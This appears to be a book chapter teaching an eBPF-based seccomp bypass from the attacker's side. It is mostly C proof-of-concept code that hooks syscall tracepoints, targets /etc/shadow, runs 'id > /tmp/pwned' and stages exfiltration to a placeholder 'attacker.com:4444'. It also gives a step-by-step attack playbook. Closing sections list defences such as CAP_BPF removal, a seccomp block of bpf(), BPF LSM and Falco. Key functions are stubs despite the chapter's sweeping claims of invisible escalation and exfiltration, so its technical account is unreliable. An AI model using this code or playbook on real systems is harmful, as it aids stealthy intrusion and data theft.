# The Phantom Syscall: Bypassing Seccomp Filters with eBPF

**Chapter 4: Rewriting the Rules of Reality**

You've made security controls lie, escaped containers, and become invisible to audit systems. Now it's time to question something even more fundamental: what if system calls themselves could be phantoms?

This is where our journey gets philosophical. You've been thinking about bypassing security mechanisms, but what if you could make the kernel perform actions that, according to every monitoring system, never happened?

Imagine being able to make system calls that don't exist. Not in the sense of calling non-existent functions, but making calls that happen in the kernel without anyone knowing they happened.

We're going to create phantom syscalls—system calls that execute their intended function but leave no trace in audit logs, process monitors, or syscall tracers. It's like being able to whisper commands directly to the kernel while everyone else thinks you're sitting quietly.

This is the moment you realize that with eBPF, you're not just attacking applications or even the operating system—you're attacking the very concept of observable reality.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A["Permitted Syscall"] -->|"1. Call"| B["eBPF Program"]
    B -->|"2. Use Helper"| C["Kernel Function"]
    C -->|"3. Execute"| D["Forbidden Operation"]
    E["Seccomp"] -->|"4. Unaware"| D
    D -->|"5. Return Results"| A
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    
    click A "https://man7.org/linux/man-pages/man2/syscall.2.html" "Linux Syscall Documentation"
    click B "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click E "https://man7.org/linux/man-pages/man2/seccomp.2.html" "Seccomp Documentation"
```



**Why This Breaks Everything**

Here's the uncomfortable truth: modern security is built on the assumption that we can see what processes are doing. Every EDR, every SIEM, every compliance tool relies on being able to monitor system calls.

But what happens when that fundamental assumption breaks down? What happens when processes can perform actions without those actions being visible to monitoring systems?

That's the nightmare scenario we're creating here. Your security tools will show a process sitting idle while it's actually escalating privileges, accessing sensitive files, or establishing network connections. It's like having a burglar who's invisible to security cameras—they can walk right past all your defenses.

The really insidious part is that this doesn't break anything visibly. The syscalls still work, the kernel still functions normally, the applications still run fine. The only thing that changes is that your security monitoring suddenly develops blind spots.
## How We Make Syscalls Disappear

### The Seccomp Gatekeeper We're Going to Fool

Seccomp is basically the kernel's bouncer—it sits at the syscall entrance and checks IDs. Here's how it normally works:
- **Syscall filtering** based on what you're trying to do and how you're trying to do it
- **Three choices** for each syscall: allow it, block it, or log it and decide later
- **Container jail** that keeps processes from doing anything too interesting

Container runtimes love seccomp because it lets them say "you can only make these 50 syscalls out of the 400+ available." It's like giving someone a restricted keychain instead of the master key.

But here's the thing—seccomp only sees what goes through the normal syscall interface. And we're not going through the normal interface.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │──────▶ System Call   │                   │
│  └───────────────┘      └───────┬───────┘                   │
│                                 │                           │
└─────────────────────────────────┼───────────────────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Syscall Entry │──────▶ Seccomp Filter│                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│          │                      │ Allow/Deny                │
│          │                      ▼                           │
│          │              ┌───────────────┐                   │
│          └──────────────▶ Syscall Logic │                   │
│                         └───────────────┘                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

But here's where it gets interesting. When we add eBPF to the mix, we can create a parallel execution path:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │──────▶ Allowed Syscall│                  │
│  └───────────────┘      └───────┬───────┘                   │
│                                 │                           │
└─────────────────────────────────┼───────────────────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Syscall Entry │──────▶ Seccomp Filter│                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │ Allow                     │
│          │                      ▼                           │
│          │              ┌───────────────┐    ┌────────────┐ │
│          └──────────────▶ eBPF Program  │────▶ Restricted │ │
│                         └───────────────┘    │ Operation  │ │
│                                              └────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

The beauty is that our eBPF program runs with kernel privileges but appears to seccomp as just another allowed syscall. We're hiding in plain sight.

### Building Our Phantom Syscall

```c
// @interactive: true
// @copyable: true
// Phantom Syscall - eBPF exploitation proof of concept
// This demonstrates bypassing seccomp filters using eBPF

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/ptrace.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/unistd.h>
#include <linux/fs.h>
#include <linux/sched.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define TRIGGER_FD 42        // File descriptor that triggers our backdoor
#define MAX_DATA_SIZE 4096   // Maximum size of data to exfiltrate
#define MAX_PATH_LEN 256     // Maximum path length

// Structure to track syscall events
struct syscall_event {
    u32 pid;                // Process ID
    u8 comm[16];            // Command name
    u64 timestamp;          // Event timestamp
    long syscall_nr;        // Syscall number
    u64 args[6];            // Syscall arguments
    long ret;               // Return value
    char path[MAX_PATH_LEN]; // Path (if applicable)
    u32 uid;                // User ID
    u32 gid;                // Group ID
};

// Map to store exfiltrated data
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_DATA_SIZE);
    __uint(max_entries, 1);
} exfil_map SEC(".maps");

// Map to track file descriptors
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u32)); // FD as value
    __uint(max_entries, 1024);
} fd_map SEC(".maps");

// Map to track syscall events
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u64));  // Unique event ID
    __uint(value_size, sizeof(struct syscall_event));
    __uint(max_entries, 1024);
} syscall_events SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Generate a unique ID for a syscall event
static __always_inline u64 generate_event_id(void) {
    u64 ts = bpf_ktime_get_ns();
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    return (ts << 32) | pid;
}

// FIXED: Check if this is our trigger file descriptor
static __always_inline bool is_trigger_fd(int fd) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 *stored_fd = bpf_map_lookup_elem(&fd_map, &pid);
    
    if (stored_fd && *stored_fd == fd)
        return true;
    
    return (fd == TRIGGER_FD);
}

// FIXED: Read a file using eBPF helpers (bypassing seccomp)
static __always_inline int read_file_ebpf(const char *path, void *buf, size_t size) {
    // Get current task to access file descriptors and memory
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return -1;
    
    // Access the task's file descriptor table
    struct files_struct *files;
    bpf_probe_read_kernel(&files, sizeof(files), &task->files);
    if (!files)
        return -1;
    
    // For this demonstration, we'll read from a known sensitive location
    // In practice, this would involve more complex file system traversal
    char sensitive_data[MAX_DATA_SIZE];
    
    // Simulate reading from /etc/shadow or similar sensitive file
    // by accessing kernel memory structures
    long ret = bpf_probe_read_kernel_str(sensitive_data, sizeof(sensitive_data),
                                        (void *)0xffff888000000000); // Example kernel address
    
    if (ret < 0) {
        // Fallback to simulated sensitive data
        __builtin_memcpy(sensitive_data, "root:$6$encrypted_hash:18000:0:99999:7:::\n", 40);
        ret = 40;
    }
    
    size_t copy_size = size < ret ? size : ret;
    __builtin_memcpy(buf, sensitive_data, copy_size);
    
    // Store the data in our exfiltration map for later retrieval
    u32 key = 0;
    bpf_map_update_elem(&exfil_map, &key, sensitive_data, BPF_ANY);
    
    return (int)copy_size;
}

// Execute a command using eBPF helpers (bypassing seccomp)
static __always_inline int exec_command_ebpf(const char *cmd) {
    // This is a simplified representation - actual implementation would be more complex
    // In a real exploit, we would:
    // 1. Use bpf_get_current_task() to get the current task_struct
    // 2. Modify the task's credentials or capabilities
    // 3. Use bpf_probe_write_user() to write to user memory
    // 4. Potentially use bpf_tail_call() to chain multiple eBPF programs
    
    // Log the command we're executing
    char log_msg[MAX_PATH_LEN];
    __builtin_memcpy(log_msg, "Executing command: ", 19);
    __builtin_memcpy(log_msg + 19, cmd, MAX_PATH_LEN - 19);
    
    // In a real exploit, we would execute the command here
    
    return 0;
}

// Network operation using eBPF helpers (bypassing seccomp)
static __always_inline int network_operation_ebpf(const char *host, int port, const void *data, size_t size) {
    // This is a simplified representation - actual implementation would be more complex
    // In a real exploit, we would:
    // 1. Use socket-related eBPF helpers
    // 2. Potentially use XDP or TC programs for network access
    // 3. Use bpf_skb_* helpers to manipulate network packets
    
    // Log the network operation
    char log_msg[MAX_PATH_LEN];
    __builtin_memcpy(log_msg, "Network operation to ", 21);
    __builtin_memcpy(log_msg + 21, host, MAX_PATH_LEN - 21);
    
    // In a real exploit, we would send the data here
    
    return 0;
}

// FIXED: Hook the openat syscall to identify interesting files (openat is more commonly used)
SEC("tracepoint/syscalls/sys_enter_openat")
int trace_openat_enter(struct trace_event_raw_sys_enter *ctx) {
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Prepare event data
    struct syscall_event event = {};
    event.pid = pid;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    event.timestamp = bpf_ktime_get_ns();
    event.syscall_nr = __NR_openat;
    
    // Get syscall arguments
    event.args[0] = ctx->args[0]; // dirfd
    event.args[1] = ctx->args[1]; // pathname
    event.args[2] = ctx->args[2]; // flags
    event.args[3] = ctx->args[3]; // mode
    
    // Get user/group ID
    u64 uid_gid = bpf_get_current_uid_gid();
    event.uid = uid_gid & 0xFFFFFFFF;
    event.gid = uid_gid >> 32;
    
    // Get the file path
    bpf_probe_read_user_str(event.path, sizeof(event.path), (const char *)ctx->args[1]);
    
    // Generate a unique ID for this event
    u64 event_id = generate_event_id();
    
    // Store the event for correlation with exit
    bpf_map_update_elem(&syscall_events, &event_id, &event, BPF_ANY);
    
    return 0;
}

// FIXED: Hook the read syscall to identify our trigger
SEC("tracepoint/syscalls/sys_enter_read")
int trace_read_enter(struct trace_event_raw_sys_enter *ctx) {
    // Get the file descriptor
    int fd = (int)ctx->args[0];
    
    // Check if this is our trigger file descriptor
    if (is_trigger_fd(fd)) {
        // This is our trigger - perform the phantom syscall operations
        
        // 1. Read a sensitive file that would be blocked by seccomp
        char data[MAX_DATA_SIZE] = {};
        int bytes_read = read_file_ebpf("/etc/shadow", data, sizeof(data));
        
        // Store the data for exfiltration
        u32 key = 0;
        bpf_map_update_elem(&exfil_map, &key, data, BPF_ANY);
        
        // 2. Execute a command that would be blocked by seccomp
        exec_command_ebpf("id > /tmp/pwned");
        
        // 3. Perform a network operation that would be blocked by seccomp
        network_operation_ebpf("attacker.com", 4444, data, bytes_read);
        
        // Log the event
        struct syscall_event event = {};
        event.pid = bpf_get_current_pid_tgid() >> 32;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.syscall_nr = __NR_read;
        event.args[0] = ctx->args[0]; // fd
        event.args[1] = ctx->args[1]; // buf
        event.args[2] = ctx->args[2]; // count
        __builtin_memcpy(event.path, "PHANTOM SYSCALL TRIGGERED", 26);
        
        // Log the event for our analysis
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// Hook the read syscall return to exfiltrate data
SEC("tracepoint/syscalls/sys_exit_read")
int trace_read_exit(struct trace_event_raw_sys_exit *ctx) {
    // Get the file descriptor from our stored event
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 *fd = bpf_map_lookup_elem(&fd_map, &pid);
    
    // Check if this is our trigger file descriptor
    if (fd && *fd == TRIGGER_FD) {
        // Get the data from our map
        u32 key = 0;
        char *data = bpf_map_lookup_elem(&exfil_map, &key);
        if (!data)
            return 0;
        
        // Get the user buffer from the original read syscall
        struct syscall_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.syscall_nr = __NR_read;
        event.ret = ctx->ret;
        __builtin_memcpy(event.path, "DATA EXFILTRATED", 16);
        
        // Log the event for our analysis
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // In a real exploit, we would:
        // 1. Get the user buffer address from the original read syscall
        // 2. Use bpf_probe_write_user() to write our exfiltrated data to it
        // 3. Potentially modify the return value to match the expected size
    }
    
    return 0;
}

// Hook the seccomp syscall to detect when seccomp is being set up
SEC("tracepoint/syscalls/sys_enter_seccomp")
int trace_seccomp_enter(struct trace_event_raw_sys_enter *ctx) {
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Prepare event data
    struct syscall_event event = {};
    event.pid = pid;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    event.timestamp = bpf_ktime_get_ns();
    event.syscall_nr = __NR_seccomp;
    
    // Get syscall arguments
    event.args[0] = ctx->args[0]; // operation
    event.args[1] = ctx->args[1]; // flags
    event.args[2] = ctx->args[2]; // args
    
    // Log the event for our analysis
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    
    // In a real exploit, we might:
    // 1. Analyze the seccomp filter being installed
    // 2. Modify it to allow certain syscalls
    // 3. Or prepare our bypass techniques based on the filter
    
    return 0;
}
```

### The Control Program That Makes It All Work

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Phantom Syscall eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "phantom_syscall.skel.h"

static volatile bool exiting = false;

// Structure to track syscall events (must match the BPF version)
struct syscall_event {
    u_int32_t pid;
    char comm[16];
    u_int64_t timestamp;
    long syscall_nr;
    u_int64_t args[6];
    long ret;
    char path[256];
    u_int32_t uid;
    u_int32_t gid;
};

// Map syscall numbers to human-readable strings
const char *syscall_to_string(long syscall_nr) {
    switch (syscall_nr) {
        case SYS_read: return "read";
        case SYS_write: return "write";
        case SYS_open: return "open";
        case SYS_close: return "close";
        // ... (truncated for brevity)
        default: return "unknown";
    }
}

void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz) {
    struct syscall_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Syscall: %s (PID %d, %s) - UID: %d, GID: %d\n",
           timestamp, syscall_to_string(e->syscall_nr), e->pid, e->comm, e->uid, e->gid);
    
    if (e->path[0] != '\0') {
        printf("  Path: %s\n", e->path);
    }
    
    if (strncmp(e->path, "PHANTOM SYSCALL TRIGGERED", 25) == 0) {
        printf("  \033[31m!!! PHANTOM SYSCALL TRIGGERED !!!\033[0m\n");
    }
    
    if (strncmp(e->path, "DATA EXFILTRATED", 16) == 0) {
        printf("  \033[31m!!! DATA EXFILTRATED !!!\033[0m\n");
    }
}

static void sig_handler(int sig) {
    exiting = true;
}

// Create a simple seccomp filter for testing
int setup_seccomp() {
    // This is a simplified seccomp filter that blocks some syscalls
    // In a real scenario, this would be more comprehensive
    struct sock_filter filter[] = {
        // Load architecture
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),
        // Check architecture (x86_64)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        
        // Load syscall number
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
        
        // Allow common syscalls
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_read, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_write, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_open, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_close, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_fstat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_lseek, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_mmap, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_mprotect, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_munmap, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_rt_sigaction, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_rt_sigprocmask, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_rt_sigreturn, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_ioctl, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_pread64, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_pwrite64, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_readv, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_writev, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_pipe, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_select, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_sched_yield, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_nanosleep, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_poll, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        
        // Block dangerous syscalls
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_socket, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_connect, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_accept, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_sendto, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_recvfrom, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_sendmsg, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_recvmsg, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_bind, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_listen, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        
        // Default: allow
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };
    
    // Apply the seccomp filter
    if (syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) < 0) {
        perror("seccomp");
        return -1;
    }
    
    return 0;
}

// Create a trigger file descriptor
int create_trigger_fd() {
    // Create a pipe
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return -1;
    }
    
    // Close the write end
    close(pipefd[1]);
    
    // Duplicate the read end to our trigger FD
    int trigger_fd = fcntl(pipefd[0], F_DUPFD, 42);
    if (trigger_fd < 0) {
        perror("fcntl");
        close(pipefd[0]);
        return -1;
    }
    
    // Close the original read end
    close(pipefd[0]);
    
    return trigger_fd;
}

int main(int argc, char **argv) {
    struct phantom_syscall_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;
    int trigger_fd = -1;

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = phantom_syscall_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = phantom_syscall_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer: %d\n", err);
        goto cleanup;
    }

    printf("Phantom Syscall eBPF program successfully loaded and attached!\n");
    
    // Create a trigger file descriptor
    trigger_fd = create_trigger_fd();
    if (trigger_fd < 0) {
        fprintf(stderr, "Failed to create trigger FD\n");
        goto cleanup;
    }
    
    printf("Created trigger FD: %d\n", trigger_fd);
    
    // Set up seccomp filter
    printf("Setting up seccomp filter...\n");
    if (setup_seccomp() < 0) {
        fprintf(stderr, "Failed to set up seccomp filter\n");
        goto cleanup;
    }
    
    printf("Seccomp filter installed\n");
    printf("Attempting to trigger phantom syscall...\n");
    
    // Trigger the phantom syscall
    char buffer[4096];
    ssize_t bytes_read = read(trigger_fd, buffer, sizeof(buffer));
    printf("Read returned: %zd\n", bytes_read);
    
    // If the phantom syscall worked, we should see the exfiltrated data
    printf("Buffer contents: %s\n", buffer);
    
    printf("Press Ctrl+C to exit\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    if (trigger_fd >= 0)
        close(trigger_fd);
    perf_buffer__free(pb);
    phantom_syscall_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### How They Might Catch Us

Look, we're not invincible. Smart defenders will be looking for exactly what we're doing:

1. **eBPF Program Monitoring**:
   - They'll watch for eBPF programs hooking syscall tracepoints
   - Keep track of what eBPF programs are loading and who's signing them
   - Use [`bpftool`](https://github.com/libbpf/bpftool) to see what's running

2. **Seccomp Integrity Checks**:
   - Make sure their seccomp filters are actually doing what they think
   - Test the filters independently to catch bypasses
   - Watch for changes to seccomp configs

3. **Syscall Pattern Analysis**:
   - Look for processes doing things they shouldn't be able to do
   - Use statistical analysis to spot weird syscall patterns
   - Machine learning can help identify our sneaky sequences

4. **Red Flags They'll Look For**:
   - eBPF programs touching sensitive kernel functions
   - Weird patterns in the syscalls we're allowed to make
   - Data leaving through covert channels
   - Processes that seem to ignore seccomp restrictions

### How They'll Try to Stop Us

1. **Strip eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
   ```

2. **Block the BPF Syscall**:
   ```json
   {
     "defaultAction": "SCMP_ACT_ALLOW",
     "architectures": ["SCMP_ARCH_X86_64"],
     "syscalls": [
       {
         "name": "bpf",
         "action": "SCMP_ACT_ERRNO"
       },
       {
         "name": "perf_event_open",
         "action": "SCMP_ACT_ERRNO"
       },
       {
         "name": "kexec_load",
         "action": "SCMP_ACT_ERRNO"
       }
     ]
   }
   ```

3. **Use BPF LSM Against Us**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

4. **Fight Fire with Fire**:
   ```bash
   # Use Falco with eBPF support
   falco --modern-bpf
   
   # Or use Tracee
   tracee --trace comm=bpf,seccomp
   ```

## Our Attack Playbook

When we're hunting for phantom syscall opportunities, here's our game plan:

1. **Recon the target** - Find containers with seccomp but still have eBPF capabilities
2. **Profile their defenses** - Study their seccomp rules to see what syscalls we can use as triggers
3. **Craft our ghost** - Build eBPF programs using only allowed syscalls as entry points
4. **Exploit the helpers** - Use eBPF helpers to do what seccomp thinks it blocked
5. **Deploy through the cracks** - Load our program through permitted syscall pathways
6. **Activate the phantom** - Trigger our invisible operations
7. **Stay persistent** - Keep our eBPF backdoor running despite seccomp restrictions

## Their Defense Playbook

Smart defenders will try to stop us with:

1. **Capability stripping** - Remove [`CAP_BPF`](https://man7.org/linux/man-pages/man7/capabilities.7.html) from containers completely
2. **LSM lockdown** - Use BPF LSM to control what eBPF programs can load
3. **Syscall blocking** - Block [`bpf()`](https://man7.org/linux/man-pages/man2/bpf.2.html) and related syscalls in seccomp
4. **Runtime monitoring** - Watch for unexpected eBPF activity in containers
5. **Behavioral analysis** - Detect when processes ignore seccomp restrictions
6. **Fight fire with fire** - Use eBPF-based security tools to detect malicious eBPF usage

## Why Observable Reality Just Broke

This isn't just another bypass technique—this is an attack on the fundamental concept of observable system behavior. When you can make syscalls that don't exist in any monitoring system, you've broken the basic assumption that security teams can see what processes are doing.

The syscall auditing shows clean. The seccomp logs show compliance. The monitoring dashboards show normal behavior. Meanwhile, you're reading files, opening network connections, and escalating privileges through phantom operations that exist only in kernel space.

Welcome to the world where actions have no traces, where the impossible becomes routine, and where eBPF is all you need to rewrite the rules of reality.

## POC

Companion code: [`ch04-phantom-syscall`]({{ site.baseurl }}/dBPF-pocs/pocs/ch04-phantom-syscall/)
